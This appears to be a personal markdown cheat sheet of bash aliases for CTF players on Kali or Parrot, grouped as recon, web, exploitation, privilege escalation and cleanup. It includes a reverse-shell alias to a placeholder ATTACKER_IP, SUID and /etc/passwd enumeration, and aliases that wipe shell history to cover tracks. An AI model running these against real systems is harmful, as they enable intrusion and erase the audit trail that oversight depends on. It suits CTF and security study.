---
tags:
  - "#github"
  - "#type/template"
  - "#markdown"
  - "#notes"
  - "#network-security"
  - "#linux-hardware"
  - "#ctf"
  - "#kali-linux"
  - "#shell-aliases"
  - "#programming"
  - "#python"
  - "#learning"
  - "#shell-scripting"
description:
author:
created: Sunday, June 29th 2025, 12:31:31 am
source:
title: 🧠 CTF Linux Shell Aliases
date modified: Sunday, June 29th 2025, 12:43:38 am
---

Here’s a comprehensive list of **Linux shell aliases** tailored for CTF (Capture The Flag) players, especially those working in **Kali Linux** or **Parrot OS** environments. These aliases are meant to **speed up reconnaissance, enumeration, exploitation, privilege escalation, and cleanup** tasks.

---

# CTF Linux Shell Aliases

You can place these in your `.bashrc`, `.zshrc`, or a dedicated file like `~/.ctf_aliases` and source it:

```bash
source ~/.ctf_aliases
```

---

## 🔎 Recon & Enumeration

```bash
alias ports='netstat -tuln | grep LISTEN'
alias ipinfo='ip a && ip r'
alias myip='curl -s ifconfig.me'
alias whatweb='whatweb -v'
alias nmapf='nmap -sC -sV -T4 -oN nmap_full'
alias nmapq='nmap -sS -T4 -p- --min-rate=1000'
alias nmapudp='nmap -sU -T4 -p- --min-rate=1000'
alias gobusterd='gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt'
alias gobusters='gobuster dns -d DOMAIN -w /usr/share/wordlists/dns/namelist.txt'
alias ffufd='ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200'
alias waf='wafw00f http://TARGET'
alias header='curl -I http://TARGET'
```

---

## 📁 File Operations

```bash
alias l='ls -lh --color=auto'
alias la='ls -lah --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
alias extract='dtrx'
alias getflag='find / -name flag\* 2>/dev/null'
alias getperm='find / -perm -4000 2>/dev/null'
```

---

## 🧱 Web & HTTP

```bash
alias serve='python3 -m http.server 8000'
alias phpserve='php -S 0.0.0.0:8000'
alias httplog='sudo tcpdump -A -i any port 80 or port 443'
alias burp='java -jar ~/tools/burpsuite.jar'
alias curlpost='curl -X POST -d'
alias ua='curl -A "Mozilla/5.0"'
```

---

## 🧰 Exploitation & Scripting

```bash
alias pwncat='rlwrap nc -lvnp'
alias revip='ip a | grep -E "inet\s"'
alias revsh='bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
alias shellz='python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
alias upgrade='python3 -c "import pty; pty.spawn(\"/bin/bash\")"' # After running, manually type: export TERM=xterm
alias suidbin='find / -perm -4000 -type f 2>/dev/null'
alias linpeas='./linpeas.sh | tee linpeas.log'
```

---

## 📈 Privilege Escalation

```bash
alias checkperm='find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null'
alias pshell='python3 -c "import pty;pty.spawn(\'/bin/bash\')"'
alias suidlist='find / -type f -perm -04000 -ls 2>/dev/null'
alias gtfo='xdg-open https://gtfobins.github.io'
alias sudoers='sudo -l'
alias chkcron='ls -la /etc/cron*'
alias chkpasswd='cat /etc/passwd | grep sh$'
```

---

## 🛜 Network Utilities

```bash
alias myports='ss -tulwn'
alias sniff='sudo tcpdump -i any -nn'
alias scanlive='for ip in $(seq 1 254); do ping -c1 192.168.1.$ip | grep "64 bytes"; done'
alias dnslookup='dig +short'
alias whoisall='whois $(whoami)@$(hostname)'
```

---

## 🔧 Automation & Tools

```bash
alias autorev='searchsploit $(file target | cut -d ":" -f2)'
alias httpx='cat urls.txt | httpx -title -status -tech-detect -favicon'
alias amassenum='amass enum -passive -d DOMAIN'
alias subfinder='subfinder -d DOMAIN -silent'
```

---

## 🧼 Cleanup

```bash
alias cleanup='history -c && history -w && rm -f ~/.bash_history'
alias killpy='pkill -f python3'
alias clearlogs='> ~/.bash_history && history -c && unset HISTFILE'
```

---

## 🧪 Dev & Script Shortcuts

```bash
alias py='python3'
alias ipy='ipython'
alias e='nano'
alias p='ping'
alias c='clear'
alias gs='git status'
alias gd='git diff'
```

---

## 📂 Custom CTF Folder Management

```bash
alias ctftemp='mkdir -p ~/ctf && cd ~/ctf'
alias bandit='ssh bandit0@bandit.labs.overthewire.org -p 2220'
```

---

## 📜 Load These Aliases

To make these aliases persistent:

### 1. Save to `.ctf_aliases`

```bash
nano ~/.ctf_aliases
```

Paste the list you want. Then add this line to your `.bashrc` or `.zshrc`:

```bash
[ -f ~/.ctf_aliases ] && source ~/.ctf_aliases
```

### 2. Reload Shell

```bash
source ~/.bashrc
# or
source ~/.zshrc
```

---

## 🔍 References & Further Learning

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    
- [GTFOBins](https://gtfobins.github.io/)
    
- [HackTricks](https://book.hacktricks.xyz/)
    
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
    
- [awesome-ctf](https://github.com/apsdehal/awesome-ctf)
    
- [exploit-database](https://www.exploit-db.com/)
    
- [revshells.com](https://www.revshells.com/) (great reverse shell generator)

---
